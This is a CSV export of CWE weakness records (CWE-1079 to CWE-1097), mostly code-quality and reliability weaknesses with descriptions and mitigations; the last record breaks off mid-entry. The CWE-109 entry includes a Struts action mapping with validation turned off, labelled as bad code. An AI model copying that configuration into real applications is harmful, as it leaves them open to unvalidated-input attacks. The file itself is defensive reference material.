"CWE-1079","Parent Class without Virtual Destructor Method","A parent class contains one or more child classes, but the parent class does not have a virtual destructor method.","This issue can prevent the product from running reliably due to undefined or unexpected behaviors.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}]","[]","[]","[]","","{""name"": ""Parent Class without Virtual Destructor Method"", ""cwe_id"": ""CWE-1079"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""A parent class contains one or more child classes, but the parent class does not have a virtual destructor method."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue can prevent the product from running reliably due to undefined or unexpected behaviors.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.""}"
"CWE-108","Struts: Unvalidated Action Form","Every Action Form must have a corresponding validation form.","If a Struts Action Form Mapping specifies a form, it must have a validation form defined under the Struts Validator.","Variant","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": ""If an action form mapping does not have a validation form defined, it may be vulnerable to a number of attacks that rely on unchecked input. Unchecked input is the root cause of some of today's worst and most common software security problems. Cross-site scripting, SQL injection, and process control vulnerabilities all stem from incomplete or absent input validation."", ""scope"": ""Other"", ""impact"": ""Other""}, {""note"": ""Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack."", ""scope"": ""Confidentiality, Integrity, Availability, Other"", ""impact"": ""Other""}]","[{""phases"": ""Implementation"", ""strategy"": ""Input Validation"", ""description"": ""Map every Action Form to a corresponding validation form.\n                  An action or a form may perform validation in other ways, but the Struts Validator provides an excellent way to verify that all input receives at least a basic level of validation. Without this approach, it is difficult, and often impossible, to establish with a high level of confidence that all input is validated."", ""effectiveness"": null}]","[]","[]","","{""name"": ""Struts: Unvalidated Action Form"", ""cwe_id"": ""CWE-108"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Variant"", ""description"": ""Every Action Form must have a corresponding validation form."", ""mitigations"": [{""phases"": ""Implementation"", ""strategy"": ""Input Validation"", ""description"": ""Map every Action Form to a corresponding validation form.\n                  An action or a form may perform validation in other ways, but the Struts Validator provides an excellent way to verify that all input receives at least a basic level of validation. Without this approach, it is difficult, and often impossible, to establish with a high level of confidence that all input is validated."", ""effectiveness"": null}], ""consequences"": [{""note"": ""If an action form mapping does not have a validation form defined, it may be vulnerable to a number of attacks that rely on unchecked input. Unchecked input is the root cause of some of today's worst and most common software security problems. Cross-site scripting, SQL injection, and process control vulnerabilities all stem from incomplete or absent input validation."", ""scope"": ""Other"", ""impact"": ""Other""}, {""note"": ""Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack."", ""scope"": ""Confidentiality, Integrity, Availability, Other"", ""impact"": ""Other""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": ""Map every Action Form to a corresponding validation form.\n                  An action or a form may perform validation in other ways, but the Struts Validator provides an excellent way to verify that all input receives at least a basic level of validation. Without this approach, it is difficult, and often impossible, to establish with a high level of confidence that all input is validated."", ""detection_methods"": [], ""extended_description"": ""If a Struts Action Form Mapping specifies a form, it must have a validation form defined under the Struts Validator.""}"
"CWE-1080","Source Code File with Excessive Number of Lines of Code","A source code file has too many lines of
					code.","This issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
		 While the interpretation of ""too many lines of code"" may vary for each product or developer, CISQ recommends a default threshold value of 1000.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[]","[]","","{""name"": ""Source Code File with Excessive Number of Lines of Code"", ""cwe_id"": ""CWE-1080"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""A source code file has too many lines of\n\t\t\t\t\tcode."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.\n\t\t While the interpretation of \""too many lines of code\"" may vary for each product or developer, CISQ recommends a default threshold value of 1000.""}"
"CWE-1082","Class Instance Self Destruction Control Element","The code contains a class instance that calls the method or function to delete or destroy itself.","For example, in C++, ""delete this"" will cause the object to delete itself.
	 This issue can prevent the product from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}]","[]","[]","[]","","{""name"": ""Class Instance Self Destruction Control Element"", ""cwe_id"": ""CWE-1082"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The code contains a class instance that calls the method or function to delete or destroy itself."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""For example, in C++, \""delete this\"" will cause the object to delete itself.\n\t This issue can prevent the product from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.""}"
"CWE-1083","Data Access from Outside Expected Data Manager Component","The product is intended to manage data access through a particular data manager component such as a relational or non-SQL database, but it contains code that performs data access operations without using that component.","When the product has a data access component, the design may be intended to handle all data access operations through that component.  If a data access operation is performed outside of that component, then this may indicate a violation of the intended design.
	 This issue can prevent the product from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}]","[]","[]","[]","","{""name"": ""Data Access from Outside Expected Data Manager Component"", ""cwe_id"": ""CWE-1083"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product is intended to manage data access through a particular data manager component such as a relational or non-SQL database, but it contains code that performs data access operations without using that component."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""When the product has a data access component, the design may be intended to handle all data access operations through that component.  If a data access operation is performed outside of that component, then this may indicate a violation of the intended design.\n\t This issue can prevent the product from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.""}"
"CWE-1084","Invokable Control Element with Excessive File or Data Access Operations","A function or method contains too many
					operations that utilize a data manager or file resource.","This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
	 While the interpretation of ""too many operations"" may vary for each product or developer, CISQ recommends a default maximum of 7 operations for the same data manager or file.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[]","[]","","{""name"": ""Invokable Control Element with Excessive File or Data Access Operations"", ""cwe_id"": ""CWE-1084"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""A function or method contains too many\n\t\t\t\t\toperations that utilize a data manager or file resource."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.\n\t While the interpretation of \""too many operations\"" may vary for each product or developer, CISQ recommends a default maximum of 7 operations for the same data manager or file.""}"
"CWE-1085","Invokable Control Element with Excessive Volume of Commented-out Code","A function, method, procedure, etc. contains an excessive amount of code that has been
					commented out within its body.","This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
		 While the interpretation of ""excessive volume"" may vary for each product or developer, CISQ recommends a default threshold of 2% of commented code.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[]","[]","","{""name"": ""Invokable Control Element with Excessive Volume of Commented-out Code"", ""cwe_id"": ""CWE-1085"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""A function, method, procedure, etc. contains an excessive amount of code that has been\n\t\t\t\t\tcommented out within its body."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.\n\t\t While the interpretation of \""excessive volume\"" may vary for each product or developer, CISQ recommends a default threshold of 2% of commented code.""}"
"CWE-1086","Class with Excessive Number of Child Classes","A class contains an unnecessarily large number of
					children.","This issue makes it more difficult to understand and maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
	 While the interpretation of ""large number of children"" may vary for each product or developer, CISQ recommends a default maximum of 10 child classes.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[]","[]","","{""name"": ""Class with Excessive Number of Child Classes"", ""cwe_id"": ""CWE-1086"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""A class contains an unnecessarily large number of\n\t\t\t\t\tchildren."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to understand and maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.\n\t While the interpretation of \""large number of children\"" may vary for each product or developer, CISQ recommends a default maximum of 10 child classes.""}"
"CWE-1087","Class with Virtual Method without a Virtual Destructor","A class contains a virtual method, but the method does not have an associated virtual destructor.","This issue can prevent the product from running reliably, e.g. due to undefined behavior.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}]","[]","[]","[]","","{""name"": ""Class with Virtual Method without a Virtual Destructor"", ""cwe_id"": ""CWE-1087"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""A class contains a virtual method, but the method does not have an associated virtual destructor."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue can prevent the product from running reliably, e.g. due to undefined behavior.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.""}"
"CWE-1088","Synchronous Access of Remote Resource without Timeout","The code has a synchronous call to a remote resource, but there is no timeout for the call, or the timeout is set to infinite.","This issue can prevent the product from running reliably, since an outage for the remote resource can cause the product to hang.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}]","[]","[]","[]","","{""name"": ""Synchronous Access of Remote Resource without Timeout"", ""cwe_id"": ""CWE-1088"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The code has a synchronous call to a remote resource, but there is no timeout for the call, or the timeout is set to infinite."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue can prevent the product from running reliably, since an outage for the remote resource can cause the product to hang.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.""}"
"CWE-1089","Large Data Table with Excessive Number of Indices","The product uses a large data table that contains an excessively large number of
					indices.","This issue can make the product perform more slowly.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.
		 While the interpretation of ""large data table"" and ""excessively large number of indices"" may vary for each product or developer, CISQ recommends a default threshold of 1000000 rows for a ""large"" table and a default threshold of 3 indices.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}]","[]","[]","[]","","{""name"": ""Large Data Table with Excessive Number of Indices"", ""cwe_id"": ""CWE-1089"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product uses a large data table that contains an excessively large number of\n\t\t\t\t\tindices."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue can make the product perform more slowly.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n\t\t While the interpretation of \""large data table\"" and \""excessively large number of indices\"" may vary for each product or developer, CISQ recommends a default threshold of 1000000 rows for a \""large\"" table and a default threshold of 3 indices.""}"
"CWE-109","Struts: Validator Turned Off","Automatic filtering via a Struts bean has been turned off, which disables the Struts Validator and custom validation logic. This exposes the application to other weaknesses related to insufficient input validation.","","Variant","Draft","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Access Control"", ""impact"": ""Bypass Protection Mechanism""}]","[{""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Ensure that an action form mapping enables validation. Set the validate field to true."", ""effectiveness"": null}]","[]","[{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""<action path=\""/download\""type=\""com.website.d2.action.DownloadAction\""name=\""downloadForm\""scope=\""request\""input=\"".download\""validate=\""false\""></action>"", ""language"": ""Bad""}]}]","","{""name"": ""Struts: Validator Turned Off"", ""cwe_id"": ""CWE-109"", ""status"": ""Draft"", ""category"": """", ""examples"": [{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""<action path=\""/download\""type=\""com.website.d2.action.DownloadAction\""name=\""downloadForm\""scope=\""request\""input=\"".download\""validate=\""false\""></action>"", ""language"": ""Bad""}]}], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Variant"", ""description"": ""Automatic filtering via a Struts bean has been turned off, which disables the Struts Validator and custom validation logic. This exposes the application to other weaknesses related to insufficient input validation."", ""mitigations"": [{""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Ensure that an action form mapping enables validation. Set the validate field to true."", ""effectiveness"": null}], ""consequences"": [{""note"": """", ""scope"": ""Access Control"", ""impact"": ""Bypass Protection Mechanism""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": ""Ensure that an action form mapping enables validation. Set the validate field to true."", ""detection_methods"": [], ""extended_description"": """"}"
"CWE-1090","Method Containing Access of a Member Element from Another Class","A method for a class performs an operation that directly
					accesses a member element from another class.","This issue suggests poor encapsulation and makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[]","[]","","{""name"": ""Method Containing Access of a Member Element from Another Class"", ""cwe_id"": ""CWE-1090"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""A method for a class performs an operation that directly\n\t\t\t\t\taccesses a member element from another class."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue suggests poor encapsulation and makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-1091","Use of Object without Invoking Destructor Method","The product contains a method that accesses an object but does not later invoke
					the element's associated finalize/destructor method.","This issue can make the product perform more slowly by retaining memory and/or other resources longer than necessary.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}]","[]","[]","[]","","{""name"": ""Use of Object without Invoking Destructor Method"", ""cwe_id"": ""CWE-1091"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product contains a method that accesses an object but does not later invoke\n\t\t\t\t\tthe element's associated finalize/destructor method."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue can make the product perform more slowly by retaining memory and/or other resources longer than necessary.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.""}"
"CWE-1092","Use of Same Invokable Control Element in Multiple Architectural Layers","The product uses the same control element across multiple
					architectural layers.","This issue makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[]","[]","","{""name"": ""Use of Same Invokable Control Element in Multiple Architectural Layers"", ""cwe_id"": ""CWE-1092"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product uses the same control element across multiple\n\t\t\t\t\tarchitectural layers."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-1093","Excessively Complex Data Representation","The product uses an unnecessarily complex internal representation for its data structures or interrelationships between those structures.","This issue makes it more difficult to understand or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Class","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}, {""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}]","[]","[]","[]","","{""name"": ""Excessively Complex Data Representation"", ""cwe_id"": ""CWE-1093"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Class"", ""description"": ""The product uses an unnecessarily complex internal representation for its data structures or interrelationships between those structures."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}, {""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to understand or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-1094","Excessive Index Range Scan for a Data Resource","The product contains an index range scan for a large data table,
					but the scan can cover a large number of rows.","This issue can make the product perform more slowly.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.
	 While the interpretation of ""large data table"" and ""excessive index range"" may vary for each product or developer, CISQ recommends a threshold of 1000000 table rows and a threshold of 10 for the index range.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}]","[]","[]","[]","","{""name"": ""Excessive Index Range Scan for a Data Resource"", ""cwe_id"": ""CWE-1094"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product contains an index range scan for a large data table,\n\t\t\t\t\tbut the scan can cover a large number of rows."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Performance""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue can make the product perform more slowly.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n\t While the interpretation of \""large data table\"" and \""excessive index range\"" may vary for each product or developer, CISQ recommends a threshold of 1000000 table rows and a threshold of 10 for the index range.""}"
"CWE-1095","Loop Condition Value Update within the Loop","The product uses a loop with a control flow condition based on
					a value that is updated within the body of the loop.","This issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[]","[]","","{""name"": ""Loop Condition Value Update within the Loop"", ""cwe_id"": ""CWE-1095"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product uses a loop with a control flow condition based on\n\t\t\t\t\ta value that is updated within the body of the loop."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-1096","Singleton Class Instance Creation without Proper Locking or Synchronization","The product implements a Singleton design pattern but does not use appropriate locking or other synchronization mechanism to ensure that the singleton class is only instantiated once.","This issue can prevent the product from running reliably, e.g. by making the instantiation process non-thread-safe and introducing deadlock (CWE-833) or livelock conditions.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.","Variant","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}]","[]","[]","[]","","{""name"": ""Singleton Class Instance Creation without Proper Locking or Synchronization"", ""cwe_id"": ""CWE-1096"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Variant"", ""description"": ""The product implements a Singleton design pattern but does not use appropriate locking or other synchronization mechanism to ensure that the singleton class is only instantiated once."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Reliability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue can prevent the product from running reliably, e.g. by making the instantiation process non-thread-safe and introducing deadlock (CWE-833) or livelock conditions.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.""}"
"CWE-1097","Persistent Storable Data Element without Associated Comparison Control Element","The product uses a storable data element that does not have
					all of the associated functions or methods that are necessary to support
					comparison.","For example, with Java, a class that is made persistent requires both hashCode() and equals() methods to be defined.
